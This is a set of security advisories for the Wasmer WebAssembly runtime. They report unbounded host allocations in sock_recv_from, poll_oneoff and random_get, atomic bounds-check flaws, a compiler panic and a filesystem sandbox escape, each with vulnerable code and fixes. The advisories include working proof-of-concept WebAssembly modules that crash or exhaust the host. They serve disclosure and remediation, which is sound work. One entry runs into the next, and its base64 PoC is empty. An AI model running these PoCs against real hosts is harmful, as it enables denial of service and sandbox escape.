summary: Guest-controlled unbounded host allocation in WASIX sock_recv_from
description:
### Summary

`wasix_32v1::sock_recv_from` (and the `wasix_64v1` variant) sums guest-supplied iovec lengths and, on the slow-path (`max_size > 10240`), performs `Vec::with_capacity(max_size)` followed by an `unsafe { buf.set_len(max_size) }`. Each iovec's `buf_len` is a guest-supplied `u32` (`M::Offset`), and there is no cap on either the per-iovec length or the running sum. A guest passing a single iovec with `buf_len = 0xFFFF_FFFF` forces the host to reserve ~4 GiB; multiple iovecs allow the request to grow without bound up to `usize` overflow (which itself is unchecked and silently wraps on debug-disabled release builds).

This is a sibling of GHSA-p7h3-r7cm-8wrm (`random_get`) — same primitive (guest-supplied length flows into a host allocation), different syscall.

### Vulnerable code

[`lib/wasix/src/syscalls/wasix/sock_recv_from.rs:61-119`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/syscalls/wasix/sock_recv_from.rs#L61-L119):

```rust
let iovs_arr = wasi_try_mem_ok!(ri_data.slice(&memory, ri_data_len));
// ...
let max_size = {
    let mut max_size = 0usize;
    for iovs in iovs_arr.iter() {
        let iovs = wasi_try_mem_ok!(iovs.read());
        let buf_len: usize = wasi_try_ok!(iovs.buf_len.try_into().map_err(|_| Errno::Overflow));
        max_size += buf_len;                          // <-- unchecked sum
    }
    max_size
};

let (bytes_read, peer) = {
    if max_size <= 10240 {
        let mut buf: [MaybeUninit<u8>; 10240] = unsafe { MaybeUninit::uninit().assume_init() };
        // ... small-buffer fast path
    } else {
        let (data, peer) = wasi_try_ok!(__sock_asyncify(
            env, sock, Rights::SOCK_RECV_FROM, |socket, fd| async move {
                // ...
                let mut buf = Vec::with_capacity(max_size);      // <-- unbounded
                unsafe { buf.set_len(max_size); }
                socket.recv_from(env.tasks().deref(), &mut buf, ...).await
                // ...
```

`sum += buf_len` has no `checked_add` and no per-iovec cap. With one iovec of `buf_len = 0xFFFF_FFFF` the host commits to a ~4 GiB Vec; with multiple iovecs the sum can reach `usize::MAX` before any guard fires.

The handler is bound for the `wasix_32v1` namespace ([`lib/wasix/src/lib.rs:639`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/lib.rs#L639)) and `wasix_64v1` (`:786`).

### Production reachability

The handler requires a valid socket fd in the WASI state. A guest can satisfy this by calling `sock_open(Addressfamily::Inet4, Socktype::Dgram, SockProto::Udp, ...)` first, which the default WASIX import set exposes. No network capability or external connectivity is needed — the `Vec::with_capacity(max_size)` runs inside the `__sock_asyncify` closure but executes before `socket.recv_from` returns its eventual error (`Errno::notconn` for an unconnected UDP socket). The alloc has already happened by then.

### PoC

Minimal `.wat`:

```wasm
(module
  (import "wasix_32v1" "sock_open"
    (func $sock_open (param i32 i32 i32 i32) (result i32)))
  (import "wasix_32v1" "sock_recv_from"
    (func $sock_recv_from (param i32 i32 i32 i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  ;; iovec_t at 0x200: buf=0x1000, buf_len=0xFFFFFFFF
  (data (i32.const 0x200) "\00\10\00\00\ff\ff\ff\ff")
  (func (export "_start") (local $sockfd i32)
    i32.const 1 i32.const 2 i32.const 17 i32.const 0x100
    call $sock_open  drop
    i32.const 0x100  i32.load  local.set $sockfd
    local.get $sockfd
    i32.const 0x200 i32.const 1 i32.const 0
    i32.const 0x300 i32.const 0x310 i32.const 0x320
    call $sock_recv_from  drop))
```

Driver: `wasmer run --net poc.wasm`.

Observed end-to-end on wasmer 7.1.0 (Homebrew bottle, macOS), `RUST_LOG=trace`:

```
TRACE sock_open: ... return=Ok(Errno::success) ... sock=6
TRACE sock_recv_from: ... return=Ok(Errno::notconn) sock=6
```

The trace confirms `sock_open` succeeded (fd 6) and `sock_recv_from` entered the handler; the `Errno::notconn` returned from `socket.recv_from` deep inside the async closure proves the closure executed past the `Vec::with_capacity(max_size)` allocation.

Microbench mirroring `vec![0u8; 4 GiB]` (the same allocator path Rust uses for zero-initialized vec):

```
vec![0u8; 4294967295] (4 GiB request)
vec! returned in 16.459µs, len=4294967295, cap=4294967295
```

On macOS / Linux-with-overcommit the alloc returns instantly via lazy MAP_ANON; on hosts with `RLIMIT_AS`, strict-overcommit, or 32-bit address space the alloc fails and the wasmer process aborts. If the guest can arrange any actual data to land in the recv buffer (e.g. connect the socket first and pipe data) the host commits the full requested length.

### Impact

Denial-of-service against the wasmer host process when network/WASIX capability is granted to a guest. The DoS angle splits along host configuration: strict-overcommit / 32-bit / cgroup-limited hosts abort on the alloc; overcommit hosts inflate VSZ and (if recv_from receives any data) commit RSS.

### Proposed fix

Add a configurable `max_sock_recv_size: Option<u64>` (default 16 MiB, mirroring the `max_random_size` shape). After computing `max_size`, return `Errno::Inval` if it exceeds the cap, *before* taking the slow path or entering `__sock_asyncify`:

```rust
if let Some(max) = env.capabilities.max_sock_recv_size
    && (max_size as u64) > max
{
    return Ok(Errno::Inval);
}
```

Additionally, the running sum `max_size += buf_len` should use `checked_add` to defend against guest-controlled iovec sums that wrap `usize`.

A symmetric guard belongs in `sock_recv` (the sibling sibling) and any other syscall summing guest-supplied iovec lengths.

### Cross-reference

Sibling of GHSA-p7h3-r7cm-8wrm (same primitive, different syscall).

### Credits

tonghuaroot

summary: Guest-controlled unbounded host allocation in WASI poll_oneoff
description:
### Summary

`wasi_snapshot_preview1::poll_oneoff(in_, out_, nsubscriptions, nevents)` performs a host-side `Vec::with_capacity(nsubscriptions)` on a guest-controlled `nsubscriptions: u32` without applying any cap. `nsubscriptions = 0xFFFF_FFFF` forces the host to reserve roughly 200 GiB of virtual address space for the subscription staging vector (the element type is `(Option<WasiFd>, PollEventSet, Subscription)`, ~56 bytes on Memory32). On allocator implementations or hosts where this commits (32-bit hosts, containers without overcommit, embedded), the wasmer process aborts; on overcommit hosts (default Linux, macOS) the host's virtual address space is inflated, eventually swap-storming or hitting cgroup/`RLIMIT_AS` quotas.

This is a sibling of GHSA-p7h3-r7cm-8wrm (`random_get`) — same primitive (guest-supplied `u32` length flows directly into a host allocation), different syscall.

### Vulnerable code

[`lib/wasix/src/syscalls/wasi/poll_oneoff.rs:79-87`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/syscalls/wasi/poll_oneoff.rs#L79-L87):

```rust
pub fn poll_oneoff<M: MemorySize + 'static>(
    mut ctx: FunctionEnvMut<'_, WasiEnv>,
    in_: WasmPtr<Subscription, M>,
    out_: WasmPtr<Event, M>,
    nsubscriptions: M::Offset,
    nevents: WasmPtr<M::Offset, M>,
) -> Result<Errno, WasiError> {
    // ...
    let subscription_array = wasi_try_mem_ok!(in_.slice(&memory, nsubscriptions));
    let mut subscriptions = Vec::with_capacity(subscription_array.len() as usize); // <-- unbounded
    for n in 0..subscription_array.len() {
        // ...
```

`WasmSlice::new` only performs a u64 arithmetic-overflow check on `offset + len * size_of::<T>()`; it does not validate that the slice fits within the guest's linear memory. For `nsubscriptions = 0xFFFF_FFFF`, `0xFFFF_FFFF * 48` does not overflow u64, so the slice constructor returns successfully and the host alloc proceeds. The bound check happens only on per-element reads inside the loop, which means the host has already committed to the `Vec::with_capacity` request before the first failed read.

The handler is bound for `wasi_snapshot_preview1` ([`lib/wasix/src/lib.rs:488`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/lib.rs#L488)), WASIX 32-bit (`:560`), and WASIX 64-bit (`:707`). For Memory64 guests the cap on `nsubscriptions` is `u64::MAX`, making the primitive even more pathological.

### Production reachability

The handler is exported from the default `WasiRunner` / `WasiEnvBuilder` import sets. Any guest can import `wasi_snapshot_preview1::poll_oneoff` and invoke it. No socket, file descriptor, or capability negotiation is required.

### PoC

Minimal `.wat` (109 bytes after `wat2wasm`):

```wasm
(module
  (import "wasi_snapshot_preview1" "poll_oneoff"
    (func $poll_oneoff (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  (func (export "_start")
    i32.const 0           ;; in_  pointer
    i32.const 0           ;; out_ pointer
    i32.const -1          ;; nsubscriptions = 0xFFFFFFFF
    i32.const 0           ;; nevents pointer
    call $poll_oneoff
    drop))
```

Driver: `wasmer run poc.wasm`.

Observed end-to-end on wasmer 7.1.0 (Homebrew bottle, macOS), `RUST_LOG=trace`:

```
WARN ThreadId(14) poll_oneoff: wasmer::backend::sys::entities::memory:
    attempted to read (48 bytes) beyond the bounds of the memory view
    (65568 > 65536)
TRACE poll_oneoff: wasmer_wasix::syscalls::wasi::poll_oneoff:
    return=Ok(Errno::memviolation)
```

The trace confirms the handler executed past line 80 (the `in_.slice` call) and entered the per-element loop body; the `Vec::with_capacity(0xFFFF_FFFF)` on line 81 ran to completion before the loop's first read failed.

Microbench mirroring the host allocation (`Vec::<(Option<u32>, u16, [u8; 56])>::with_capacity(0xFFFF_FFFF)`):

```
sizeof tuple = 72
Vec::with_capacity(4294967295) requests 309237645240 bytes = 288 GiB
with_capacity returned in 42ns, len=0, cap=4294967295
```

On macOS the request returns instantly via `mmap MAP_ANON` (lazy commit), so RSS does not climb on this PoC — but the host has reserved 288 GiB of VM, which on a host with `RLIMIT_AS` or `vm.overcommit_memory=2` aborts the process. On the parent advisory's `random_get` PoC, full RSS commit was observed because `getrandom::fill` writes into the entire buffer; here the loop terminates on the first failed read, so commit is bounded by the allocator's lazy-fault behavior.

### Impact

Denial-of-service against the wasmer host process. Any embedder using a default `WasiRunner` / `WasiEnvBuilder` configuration is exposed. On constrained hosts (containers, FaaS sandboxes, embedded systems) the allocation request fails and the host aborts; on capable hosts the guest can repeatedly issue this call to inflate the host's virtual address space, exhaust `RLIMIT_AS`, or chew through a memory cgroup quota.

### Proposed fix

Add a configurable `max_poll_subscriptions: Option<u64>` on the WASI capability set, defaulting to a small value (e.g. 1024 — large enough for any realistic application, small enough that the worst-case host alloc is ~56 KiB). In `poll_oneoff`:

```rust
let nsubs64: u64 = nsubscriptions.into();
if let Some(max) = env.capabilities.max_poll_subscriptions
    && nsubs64 > max
{
    return Ok(Errno::Inval);
}
```

Symmetric guard belongs in `legacy::snapshot0::poll_oneoff` and the WASIX-namespace `poll_oneoff_internal` entry.

### Cross-reference

Sibling of GHSA-p7h3-r7cm-8wrm (same primitive, different syscall).

### Credits

tonghuaroot

summary: Guest-controlled unbounded host allocation in WASI random_get
description:
### Summary

`wasi_snapshot_preview1::random_get(buf, buf_len)` performs an infallible host-side allocation of `buf_len` bytes (`vec![0; buf_len64 as usize]`) without applying any cap. `buf_len` is fully attacker-controlled by the wasm guest. A guest passing `buf_len = 0xFFFF_FFFF` forces the host to allocate ~4 GiB; on memory-constrained hosts this aborts the wasmer process, on hosts with a large virtual address space it pins ~4 GiB of host memory while `getrandom::fill` writes the buffer.

### Vulnerable code

[`lib/wasix/src/syscalls/wasi/random_get.rs:12`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/syscalls/wasi/random_get.rs#L12):

```rust
pub fn random_get<M: MemorySize>(
    ctx: FunctionEnvMut<'_, WasiEnv>,
    buf: WasmPtr<u8, M>,
    buf_len: M::Offset,
) -> Errno {
    let env = ctx.data();
    let memory = unsafe { env.memory_view(&ctx) };
    let buf_len64: u64 = buf_len.into();
    let mut u8_buffer = vec![0; buf_len64 as usize];   // <-- no cap, infallible
    let res = getrandom::fill(&mut u8_buffer);
    ...
}
```

The same handler is bound for `wasi_unstable`, `wasi_snapshot_preview1`, and the WASIX import set, in both `Memory32` and `Memory64` variants ([`lib/wasix/src/lib.rs:435`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/lib.rs#L435), `:491`, `:579`, `:726`). For `Memory64` guests the cap is `u64::MAX`, which makes the primitive even more pathological.

### PoC

Two-instruction `.wat`:

```wasm
(module
  (import "wasi_snapshot_preview1" "random_get"
    (func $random_get (param i32 i32) (result i32)))
  (memory (export "memory") 1)
  (func (export "_start")
    i32.const 0
    i32.const -1            ;; buf_len = 0xFFFF_FFFF
    call $random_get
    drop))
```

Driver (uses default `WasiRunner` + `PluggableRuntime`):

```rust
let wasm_bytes = wat::parse_str(POC_WAT)?;
let module = runtime.load_hashed_module_sync(HashedModuleData::new(wasm_bytes.clone()), None)?;
let mut runner = WasiRunner::new();
runner.run_wasm(RuntimeOrEngine::Runtime(Arc::new(runtime)), "poc", module,
    wasmer_types::ModuleHash::new(wasm_bytes))?;
```

Observed end-to-end on wasmer HEAD (commit a9a2712, May 2026), `/usr/bin/time -l`:

```
[poc] pre-call host RSS approx 6 MiB
[poc] invoking guest _start (calls random_get with buf_len = 0xFFFFFFFF)...
[poc] elapsed 32.0958s

       32.13 real         2.68 user        15.68 sys
           408666112  maximum resident set size
        102631677007  instructions retired
          4299809728  peak memory footprint   <-- 4.00 GiB
```

A 2-instruction wasm module produces 32 s wall time, 18 s CPU time, and 4.00 GiB peak host memory footprint. The host's allocator successfully reserved and committed the full 4 GiB; the buffer is freed when `random_get` returns, so post-call RSS sampling shows only the resident slice left at sample time.

### Impact

Denial-of-service against the wasmer host process. Any embedder using a default `WasiRunner` / `WasiEnvBuilder` configuration is exposed. On constrained hosts (containers, FaaS sandboxes, embedded systems) the allocation fails and the host aborts; on capable hosts the guest can repeatedly issue this call to swap-storm the host or to chew through a memory cgroup quota.

This primitive is analogous to the issue addressed in wasmtime by GHSA-852m-cvvp-9p4w / CVE-2026-27204, which introduced `WasiCtxBuilder::max_random_size` (defaulting to 64 MiB) precisely to bound `wasi:random/random.get-random-bytes` and `wasi:random/insecure.get-insecure-random-bytes`.

### Proposed fix

Add a configurable `max_random_size: u64` on the WASI context, defaulting to a reasonable cap (e.g. 16 MiB or 64 MiB to match wasmtime). In `random_get`:

```rust
if buf_len64 > env.state.max_random_size {
    return Errno::Inval;  // or a new Errno reflecting size constraint
}
```

A symmetric guard belongs in any future `insecure_random_get` or `wasi:random` WASIp2 handler.

### Credits

tonghuaroot

description:
### Summary
`memory.atomic.wait32` uses incomplete bounds check

### Details
- Wasmer version: `6.1.0` (same in latest version `7.1.0`)
- Build features: `cranelift,singlepass`
- OS: Linux x86_64

### PoC

#### Command

1. Last in-bounds 4-byte window succeeds (timeout result):
```bash
./target/release/wasmer run --invoke wait32 poc.wasm -- 65532
```
Observed: prints `2` (timed out).

2. Address equal to memory length traps:
```bash
./target/release/wasmer run --invoke wait32 poc.wasm -- 65536
```
Observed: `RuntimeError: out of bounds memory access`.


#### Expected behavior
The atomic check helper must reject any address range that would read beyond the end of linear memory.

### Impact
possible out of bounds

[poc.wasm.zip](https://github.com/user-attachments/files/26369059/poc.wasm.zip)

```plain
(module
  (memory 1 1 shared)  ;; 65536 bytes = 1 page
  (export "memory" (memory 0))

  ;; Test notify at parametrized address
  (func (export "notify") (param $addr i32) (result i32)
    (memory.atomic.notify (local.get $addr) (i32.const 1))
  )

  ;; Test wait32 at parametrized address (expected=0, timeout=0)
  (func (export "wait32") (param $addr i32) (result i32)
    (memory.atomic.wait32 (local.get $addr) (i32.const 0) (i64.const 0))
  )

  ;; Test wait64 at parametrized address
  (func (export "wait64") (param $addr i32) (result i32)
    (memory.atomic.wait64 (local.get $addr) (i64.const 0) (i64.const 0))
  )

  ;; Get memory size in bytes
  (func (export "mem_size_bytes") (result i32)
    (i32.mul (memory.size) (i32.const 65536))
  )
)
```

### Summary
`memory.atomic.notify` missing bounds check

### Details
- Wasmer version: `6.1.0` (same in latest version `7.1.0`)
- Build features: `cranelift,singlepass`
- OS: Linux x86_64

### PoC

#### Command
```bash
./target/release/wasmer run --invoke notify poc.wasm -- 65536
```

#### Observed result
Prints `0` (no trap) for an out-of-bounds address (`dst == 65536` on a 64KiB shared memory).

#### Expected behavior
`memory.atomic.notify` must trap with an out-of-bounds error when `dst >= memory_length`.

### Impact
possible out of bounds

[poc.wasm.zip](https://github.com/user-attachments/files/26368934/poc.wasm.zip)

```plain
(module
  (memory 1 1 shared)  ;; 65536 bytes = 1 page
  (export "memory" (memory 0))

  ;; Test notify at parametrized address
  (func (export "notify") (param $addr i32) (result i32)
    (memory.atomic.notify (local.get $addr) (i32.const 1))
  )

  ;; Test wait32 at parametrized address (expected=0, timeout=0)
  (func (export "wait32") (param $addr i32) (result i32)
    (memory.atomic.wait32 (local.get $addr) (i32.const 0) (i64.const 0))
  )

  ;; Test wait64 at parametrized address
  (func (export "wait64") (param $addr i32) (result i32)
    (memory.atomic.wait64 (local.get $addr) (i64.const 0) (i64.const 0))
  )

  ;; Get memory size in bytes
  (func (export "mem_size_bytes") (result i32)
    (i32.mul (memory.size) (i32.const 65536))
  )
)
```

During the compilation process, an assertion failure occurs in the wasmer_compiler_llvm::translator::state module, specifically at state.rs:146. This issue arises due to an unexpected combination of pending NaN (Not a Number) states for 32-bit and 64-bit floating-point operations, causing a panic with the following message: ``` assertion failed: !(self.has_pending_f32_nan() && other.has_pending_f64_nan()) ``` There is a risk of correctness issues when dealing with WebAssembly modules that may trigger edge cases in floating-point operations, leading to improper execution. ### Environment ``` echo "`target/debug/wasmer -V` | `rustc -V` | `uname -m`" wasmer 4.3.7 | rustc 1.74.1 (a28077b28 2023-12-04) | x86_64 ``` Commit: 94f06844e4eeaf8ec3aaba7c75c958a7194e6328 ### Steps to reproduce - base64 poc ```  ``` 1. ### Summary
As of Wasmer version v4.2.3, Wasm programs can access the filesystem outside of the sandbox.

### Details
https://github.com/wasmerio/wasmer/issues/4267

### PoC
A minimal Rust program:

```
fn main() {
    let f = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open("abc")
        .unwrap();
}
```

This should be compiled with `cargo build --target wasm32-wasi`. The compiled program, when run with wasmer WITHOUT `--dir`, can still create a file in the working directory.

### Impact
Service providers running untrusted Wasm code on Wasmer can unexpectedly expose the host filesystem.
